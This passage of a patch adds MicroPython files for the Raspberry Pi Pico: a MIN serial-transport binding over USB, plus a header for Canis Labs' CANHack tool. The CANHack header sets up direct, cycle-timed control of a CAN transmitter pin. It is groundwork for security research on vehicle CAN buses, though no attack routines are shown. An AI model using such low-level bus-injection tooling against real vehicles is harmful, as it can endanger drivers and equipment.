+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Bytes parameter too long"));
+    }
+    for (mp_uint_t i = 0; i < bufinfo.len; i++) {
+        dest[i] = ((byte*)bufinfo.buf)[i];
+    }
+
+    return bufinfo.len;
+}
+
+// Simple function to create Micropython bytes from a block of memory
+mp_obj_t make_mp_bytes(const uint8_t *src, uint32_t len)
+{
+    vstr_t vstr;
+    vstr_init_len(&vstr, len);
+    for (mp_uint_t i = 0; i < len; i++) {
+        vstr.buf[i] = src[i];
+    }
+
+    return mp_obj_new_str_from_vstr(&mp_type_bytes, &vstr);
+}
Index: ports/rp2/canis/rp2_min.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/rp2_min.c b/ports/rp2/canis/rp2_min.c
new file mode 100644
--- /dev/null	(date 1620571241883)
+++ b/ports/rp2/canis/rp2_min.c	(date 1620571241883)
@@ -0,0 +1,384 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+#include <stdio.h>
+#include <string.h>
+#include <stdarg.h>
+#include <inttypes.h>
+#include "py/nlr.h"
+#include "py/objtuple.h"
+#include "py/runtime.h"
+#include "py/gc.h"
+#include "py/mperrno.h"
+#include "py/mphal.h"
+#include "tusb.h"
+#include "ports/rp2/canis/common.h"
+#include "rp2_min.h"
+
+
+// MIN on the Pico uses a second USB serial port (0 is stdin/stdout and used for REPL), allocated to
+// itf 1.
+
+#define MIN_CDC_ITF         (1U)
+
+#ifndef TRANSPORT_PROTOCOL
+#error "MIN transport protocol not enabled"
+#endif
+
+// Writes all the bytes requested to the USB, returns when done (this may be slow due to running
+// in XIP flash)
+STATIC void usb_write(size_t len, uint8_t *src)
+{
+    if (tud_cdc_n_connected(MIN_CDC_ITF)) {
+        for (size_t i = 0; i < len;) {
+            uint32_t n = len - i;
+            if (n > CFG_TUD_CDC_EP_BUFSIZE) {
+                n = CFG_TUD_CDC_EP_BUFSIZE;
+            }
+            while (n > tud_cdc_n_write_available(MIN_CDC_ITF)) {
+                tud_task();
+                tud_cdc_n_write_flush(MIN_CDC_ITF);
+            }
+            uint32_t n2 = tud_cdc_n_write(MIN_CDC_ITF, (const char *)(src + i), n);
+            tud_task();
+            tud_cdc_n_write_flush(MIN_CDC_ITF);
+            i += n2;
+        }
+    }
+}
+
+// Read as many characters as possible from the USB
+STATIC uint32_t usb_read(uint8_t *dest, size_t max_len)
+{
+    if (tud_cdc_n_connected(MIN_CDC_ITF) && tud_cdc_n_available(MIN_CDC_ITF)) {
+        return tud_cdc_n_read(MIN_CDC_ITF, dest, max_len);
+    }
+    return 0;
+}
+
+// Deinit the root pointer
+void min_deinit(void) {
+    // Called when the system is reset.
+    MP_STATE_PORT(rp2_min_obj) = NULL;
+}
+
+
+// Transport MIN implementation for Micropython
+//
+// One class: MIN
+//
+// T-MIN API:
+// - send_frame() - creates a MIN frame and queues it in the outgoing queue
+// - recv() - drive the state machine for sending and receiving
+//
+
+// Flags used for rp2mon bridge
+// TODO refactor rp2mon into this MIN class
+
+// Only a single MIN context is supported for the USB port
+// TODO support multiple MIN ports
+
+/////////////////// MIN CALLBACKS //////////////////
+
+#ifdef MIN_DEBUG_PRINTING
+void min_debug_print(const char *msg, ...)
+{
+    va_list vargs;
+    va_start(vargs, msg);
+    vprintf(msg, vargs);
+    va_end (vargs);
+}
+
+STATIC void print_bytes(char *msg, uint8_t *bytes, uint16_t n)
+{
+    printf(msg);
+    for (uint16_t i = 0; i < n; i++) {
+        printf("%02x", bytes[i]);
+    }
+    printf("\n");
+}
+#endif
+
+uint32_t min_time_ms(void)
+{
+    return mp_hal_ticks_ms();
+}
+
+// Don't shortcut this: return a list of MIN messages
+void min_application_handler(uint8_t min_id, uint8_t const *min_payload, uint8_t len_payload, uint8_t port)
+{
+    // Handles incoming MIN frames: accumulates the frames (as a 2-tuple) in a MicroPython list
+
+    // All other MIN frames get added to a list to return to the Python caller to deal with
+    rp2_min_obj_t *self = MP_STATE_PORT(rp2_min_obj);
+    if (self != NULL) {
+        mp_obj_tuple_t *tuple = mp_obj_new_tuple(2, NULL);
+        tuple->items[0] = MP_OBJ_NEW_SMALL_INT(min_id);
+        tuple->items[1] = make_mp_bytes(min_payload, len_payload);
+        if (self->recv_list == NULL) {
+            self->recv_list = mp_obj_new_list(0, NULL);
+        }
+        mp_obj_list_append(self->recv_list, tuple);
+    }
+}
+
+// CALLBACK. Must return current buffer space in the given port. Used to check that a frame can be
+// queued.
+uint16_t min_tx_space(uint8_t port)
+{
+    // We can lie here because we are running outside ISRs and are prepared to spin on the
+    // buffer until the frame is sent (which may of course lead instead to incoming CAN frames
+    // and transmission reports to be lost instead but that's going to happen anyway.
+    return 1024U;
+}
+
+void min_tx_byte(uint8_t port, uint8_t byte)
+{
+    rp2_min_obj_t *self = MP_STATE_PORT(rp2_min_obj);
+
+    if (self != NULL) {
+        if(self->outgoing_cdc_buf_len < CDC_BUF_SIZE) {
+            self->outgoing_cdc_buf[self->outgoing_cdc_buf_len++] = byte;
+        }
+    }
+}
+
+void min_tx_start(uint8_t port) {
+    rp2_min_obj_t *self = MP_STATE_PORT(rp2_min_obj);
+    if (self != NULL) {
+        self->outgoing_cdc_buf_len = 0;
+    }
+}
+
+void min_tx_finished(uint8_t port) {
+    rp2_min_obj_t *self = MP_STATE_PORT(rp2_min_obj);
+    if (self != NULL) {
+        usb_write(self->outgoing_cdc_buf_len, self->outgoing_cdc_buf);
+    }
+}
+
+void min_init(void) {
+    // Set up the root pointer to a null CAN controller object so that the memory is not allocated
+    // until CAN is used.
+    MP_STATE_PORT(rp2_min_obj) = NULL;
+}
+
+//////////////////////////////// MicroPython bindings ////////////////////////////////
+
+#ifdef MIN_DEBUG
+#define MIN_DEBUG_PRINT(fmt, args...)       mp_printf(MP_PYTHON_PRINTER, fmt, ##args)
+#else
+#define MIN_DEBUG_PRINT(fmt, args...)       /* */
+#endif
+
+STATIC void rp2_min_init_helper(rp2_min_obj_t *self, mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        { MP_QSTR_retransmit_timeout,      MP_ARG_KW_ONLY  | MP_ARG_INT, {.u_int = 50} },
+    };
+
+    // parse args
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args, pos_args, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    // We only run MIN on one port (USB CDC port 1), so hardwire it to zero
+    // TODO could support multiple MIN instances in the future on multiple CDC ports
+    min_init_context(&self->min_context, 0);
+}
+
+STATIC mp_obj_t rp2_min_make_new(const mp_obj_type_t *type, mp_uint_t n_args, mp_uint_t n_kw, const mp_obj_t *args)
+{
+    mp_arg_check_num(n_args, n_kw, 0, MP_OBJ_FUN_ARGS_MAX, true);
+
+    // Create class instance for controller
+    rp2_min_obj_t *self = MP_STATE_PORT(rp2_min_obj);
+
+    if (MP_STATE_PORT(rp2_min_obj) == NULL) {
+        // Newly create object (we don't want it created always because it's a fairly large object, with
+        // large receive FIFO and this shouldn't be allocated until needed).
+        self = m_new_obj(rp2_min_obj_t);
+        self->base.type = &rp2_min_type;
+        MP_STATE_PORT(rp2_min_obj) = self;
+    }
+    else {
+        self = MP_STATE_PORT(rp2_min_obj);
+    }
+
+    // configure the object
+    mp_map_t kw_args;
+    mp_map_init_fixed_table(&kw_args, n_kw, args + n_args);
+
+    rp2_min_init_helper(self, n_args, args, &kw_args);
+
+    // At the moment we use only a single MIN object
+    return self;
+}
+
+// TODO placeholder: should probably be replaced with something more meaningful in the future
+STATIC void rp2_min_print(const mp_print_t *print, mp_obj_t self_in, mp_print_kind_t kind) {
+    // TODO rp2_min_obj_t *self = self_in;
+    mp_printf(print, "MIN()");
+}
+
+STATIC mp_obj_t rp2_min_send_frame(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args) {
+    static const mp_arg_t allowed_args[] = {
+        { MP_QSTR_min_id,  MP_ARG_REQUIRED | MP_ARG_INT, {.u_int = 0 } },
+        { MP_QSTR_payload, MP_ARG_REQUIRED | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL} },
+    };
+
+    // parse args
+    rp2_min_obj_t *self = pos_args[0];
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    if (MP_STATE_PORT(rp2_min_obj) != NULL) {
+
+        // get the buffer to send from
+        mp_buffer_info_t bufinfo;
+        uint8_t data[1];
+        rp2_buf_get_for_send(args[1].u_obj, &bufinfo, data);
+
+        if (bufinfo.len > 255) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Frame too big"));
+        }
+        if (args[0].u_int > 0x3f) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "MIN ID out of range"));
+        }
+
+        // Uses the MIN transport layer to queue a frame, which ensures delivery
+        min_queue_frame(&self->min_context, (uint8_t) args[0].u_int, bufinfo.buf, (uint8_t) bufinfo.len);
+
+        // TODO return True/False depending on whether the queueing operation succeeded (it's possible that
+        //     there may be insufficient buffer space for a MIN frame in the transport queue)
+        return mp_const_none;
+    }
+    else {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_RuntimeError, "MIN de-initialized"));
+    }
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_min_send_frame_obj, 1, rp2_min_send_frame);
+
+STATIC mp_obj_t rp2_min_recv(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    rp2_min_obj_t *self = pos_args[0];
+
+    if (MP_STATE_PORT(rp2_min_obj) != NULL) {
+        // Zero the frames; if there are some then the frame handler will create a list to put them in
+        self->recv_list = NULL;
+
+        // Pull out all the bytes that have accumulated in the VCP buffer and pass to MIN.
+        self->incoming_cdc_buf_len = usb_read(self->incoming_cdc_buf, sizeof(self->incoming_cdc_buf));
+        min_poll(&self->min_context, self->incoming_cdc_buf, self->incoming_cdc_buf_len);
+
+        if(self->recv_list == NULL) {
+            return mp_const_none;
+        }
+        else {
+            return self->recv_list; // Returns a list of MIN frames that weren't handled automatically by the transport protocol
+        }
+    }
+    else {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_RuntimeError, "MIN de-initialized"));
+    }
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_min_recv_obj, 1, rp2_min_recv);
+
+// Remove MIN (and from the root pointers to allow it to be garbage collected)
+STATIC mp_obj_t rp2_min_deinit(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    // Not used
+    // rp2_min_obj_t *self = pos_args[0];
+
+    // Remove the root pointer so it will be garbage collected eventually when the reference to
+    // it itself garbage collected
+    MP_STATE_PORT(rp2_min_obj) = NULL;
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_min_deinit_obj, 1, rp2_min_deinit);
+
+STATIC mp_obj_t rp2_min_send_bytes(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args) {
+    static const mp_arg_t allowed_args[] = {
+            { MP_QSTR_payload, MP_ARG_REQUIRED | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL} },
+    };
+
+    // Not used
+    // rp2_min_obj_t *self = pos_args[0];
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    if (MP_STATE_PORT(rp2_min_obj) != NULL) {
+        // get the buffer to send from
+        mp_buffer_info_t bufinfo;
+        uint8_t data[1];
+        rp2_buf_get_for_send(args[0].u_obj, &bufinfo, data);
+
+        if (bufinfo.len > 255) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Frame too big"));
+        }
+
+        MIN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Payload accepted, preparing to send to USB\n");
+        usb_write(bufinfo.len, bufinfo.buf);
+        MIN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Payload written\n");
+
+        return mp_const_none;
+    }
+    else {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_RuntimeError, "MIN de-initialized"));
+    }
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_min_send_bytes_obj, 1, rp2_min_send_bytes);
+
+// Remove MIN (and from the root pointers to allow it to be garbage collected)
+STATIC mp_obj_t rp2_min_recv_bytes(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    // Not used
+    // rp2_min_obj_t *self = pos_args[0];
+
+    uint8_t buf[64];
+
+    if (MP_STATE_PORT(rp2_min_obj) != NULL) {
+        MIN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Preparing to read from USB\n");
+        uint32_t len = usb_read(buf, sizeof(buf));
+        MIN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Read %d bytes from USB\n", len);
+
+        return make_mp_bytes(buf, len);
+    }
+    else {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_RuntimeError, "MIN de-initialized"));
+    }
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_min_recv_bytes_obj, 1, rp2_min_recv_bytes);
+
+STATIC const mp_map_elem_t rp2_min_locals_dict_table[] = {
+    // instance methods
+    { MP_OBJ_NEW_QSTR(MP_QSTR_send_frame), (mp_obj_t)&rp2_min_send_frame_obj},
+    { MP_OBJ_NEW_QSTR(MP_QSTR_recv), (mp_obj_t)&rp2_min_recv_obj},
+    { MP_OBJ_NEW_QSTR(MP_QSTR_deinit), (mp_obj_t)&rp2_min_deinit_obj},
+    // debugging methods
+    { MP_OBJ_NEW_QSTR(MP_QSTR_send_bytes), (mp_obj_t)&rp2_min_send_bytes_obj},
+    { MP_OBJ_NEW_QSTR(MP_QSTR_recv_bytes), (mp_obj_t)&rp2_min_recv_bytes_obj},
+};
+STATIC MP_DEFINE_CONST_DICT(rp2_min_locals_dict, rp2_min_locals_dict_table);
+
+const mp_obj_type_t rp2_min_type = {
+    { &mp_type_type },
+    .name = MP_QSTR_MIN,
+    .print = rp2_min_print,
+    .make_new = rp2_min_make_new,
+    .locals_dict = (mp_obj_t)&rp2_min_locals_dict,
+};
Index: ports/rp2/canis/rp2_canhack.h
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/rp2_canhack.h b/ports/rp2/canis/rp2_canhack.h
new file mode 100644
--- /dev/null	(date 1620557608115)
+++ b/ports/rp2/canis/rp2_canhack.h	(date 1620557608115)
@@ -0,0 +1,108 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+#ifndef MICROPYTHON_CANHACK_RP2_H
+#define MICROPYTHON_CANHACK_RP2_H
+
+#include "py/runtime.h"
+#include "py/mperrno.h"
+#include "py/mphal.h"
+#include "pico/stdlib.h"
+#include "hardware/pwm.h"
+#include "hardware/gpio.h"
+
+// Definition of which ports and pins the CAN transceiver is wired to.
+
+// On the CANPico and CANHack boards, CANTX is mapped to GP22 (i.e. pin 29 on the Pico board)) and
+// CANRX to GP21 (pin 27 on the board).
+//
+// The passage of time is measured in clock cycles using a timer (the PyBoard version
+// of CANHack uses CYCCNT of the DWT because it is a Cortex M3 but the Pico board is
+// a Cortex M0+ which doesn't have that module).
+//
+// The Pi Pico RP2040 has a timer, but it is clocked at 1us, which is too coarse a timer
+// for CANHack. Instead, a PWM is used.
+
+#define     CAN_TX_PIN                      (22U)
+#define     CAN_RX_PIN                      (21U)
+#define     DEBUG_PIN                       (2U)
+#define     CANHACK_PWM                     (7U)
+
+#define     BIT_TIME                        (249U)
+#define     BAUD_500KBIT_PRESCALE           (1U)
+#define     BAUD_250KBIT_PRESCALE           (2U)
+#define     BAUD_125KBIT_PRESCALE           (4U)
+#define     SAMPLE_POINT_OFFSET             (150U)
+#define     SAMPLE_TO_BIT_END               (BIT_TIME - SAMPLE_POINT_OFFSET)
+#define     FALLING_EDGE_RECALIBRATE        (31U)
+
+#define     TIME_CRITICAL                   __attribute__((noinline, long_call, section(".time_critical")))
+
+#if (BIT_TIME * 180 > 65535)
+#error "Timer wraps over a CAN frame"
+#endif
+
+// Size of the counter (usually 16-bit or 32-bit)
+typedef uint16_t ctr_t;
+
+// These are macros that are inlined because the compiler cannot be trusted to inline and on the
+// RP2040 with XIP flash it is STRICTLY NECESSARY to inline them into a time critical function.
+// This means the Pico SDK cannot be used directly and must be replicated here.
+#define REACHED(now, t)                     ((now) >= (t))
+#define ADVANCE(now, duration)              ((now) + (duration))
+#define GET_CLOCK()                         (pwm_hw->slice[CANHACK_PWM].ctr)
+#define RESET_CLOCK(t)                      (pwm_hw->slice[CANHACK_PWM].ctr = (t))
+#define GET_GPIO(gpio)                      (!!((1ul << (gpio)) & sio_hw->gpio_in))
+#define GET_CAN_RX()                        GET_GPIO(CAN_RX_PIN)
+#define SET_GPIO(gpio, value)               {                                       \
+                                                uint32_t mask = 1ul << (gpio);      \
+                                                if (value)                          \
+                                                    sio_hw->gpio_set = mask;        \
+                                                else                                \
+                                                    sio_hw->gpio_clr = mask;        \
+                                            }
+#define SET_CAN_TX(bit)                     SET_GPIO(CAN_TX_PIN, (bit))
+#define SET_DEBUG(bit)                      SET_GPIO(DEBUG_PIN, (bit))
+#define SET_DEBUG_HIGH()                    SET_DEBUG(1U);
+#define SET_DEBUG_LOW()                     SET_DEBUG(0);
+#define PULSE_DEBUG()                       (SET_DEBUG_HIGH(), SET_DEBUG_LOW())
+#define SET_CAN_TX_DOM()                    SET_CAN_TX(0)
+#define SET_CAN_TX_REC()                    SET_CAN_TX(1U)
+
+static inline void init_gpio() {
+    // Set CAN pins to recessive and debug pin to 0
+    gpio_set_mask((1 << CAN_RX_PIN) | (1 << CAN_TX_PIN));
+    // Set pins to software controlled
+    gpio_set_function(CAN_RX_PIN, GPIO_FUNC_SIO);
+    gpio_set_function(CAN_TX_PIN, GPIO_FUNC_SIO);
+    gpio_set_function(DEBUG_PIN, GPIO_FUNC_SIO);
+    // Set direction: receive and transmit
+    gpio_set_dir(CAN_RX_PIN, GPIO_IN);
+    gpio_set_dir(CAN_TX_PIN, GPIO_OUT);
+    gpio_set_dir(DEBUG_PIN, GPIO_OUT);
+}
+
+static inline void init_ctr(uint div) {
+    pwm_config c = pwm_get_default_config();
+    // Set the counter prescale for the appropriate baud rate
+    pwm_config_set_clkdiv_int(&c, div);
+    pwm_init(CANHACK_PWM, &c,true);
+}
+
+// MicroPython CANHack object
+extern const mp_obj_type_t rp2_canhack_type;
+
+#endif //MICROPYTHON_CANHACK_RP2_H
Index: ports/rp2/canis/rp2_min.h
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/rp2_min.h b/ports/rp2/canis/rp2_min.h
new file mode 100644
--- /dev/null	(date 1620461592945)
+++ b/ports/rp2/canis/rp2_min.h	(date 1620461592945)
@@ -0,0 +1,43 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+#include <lib/min/target/min.h>
+
+#include "py/obj.h"
+#include "py/objlist.h"
+
+void min_init(void);
+void min_deinit(void);
+
+extern const mp_obj_type_t pyb_min_type;
+
+#define CDC_BUF_SIZE                (512U)
+
+extern const mp_obj_type_t rp2_min_type;
+
+typedef struct _rp2_min_obj_t {
+    mp_obj_base_t base;
+    // Defined by MIN library
+    struct min_context min_context;
+    // Additional target-specific buffer space
+    uint8_t outgoing_cdc_buf[CDC_BUF_SIZE];
+    uint16_t outgoing_cdc_buf_len;
+    uint8_t incoming_cdc_buf[CDC_BUF_SIZE];
+    int incoming_cdc_buf_len;
+    // Received MIN frames
+    mp_obj_list_t *recv_list;
+    // TODO have a per-context list
+} rp2_min_obj_t;
